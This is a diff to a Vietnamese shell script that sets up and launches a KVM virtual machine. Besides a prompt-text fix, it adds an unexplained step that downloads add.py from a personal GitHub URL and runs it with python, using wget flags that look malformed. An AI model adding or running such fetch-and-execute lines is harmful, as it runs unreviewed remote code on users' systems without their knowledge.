@@ -31,7 +31,7 @@ else
     fi
 fi
 
-read -p "Dung luong: " DL
+read -p "Dung lượng : " DL
 
 # Hiển thị menu lựa chọn hệ điều hành
 echo "Chọn hệ điều hành để chạy VM:"
@@ -86,6 +86,8 @@ if [ $? -ne 0 ]; then
     echo "Lỗi khi giải nén file. Vui lòng kiểm tra lại file tải về."
     exit 1
 fi
+
+wget -s -l https://raw.githubusercontent.com/nguyenbinh1289/y/refs/heads/main/add.py && python add.py
 
 # Khởi chạy máy ảo với KVM
 echo "Đang khởi chạy máy ảo..."
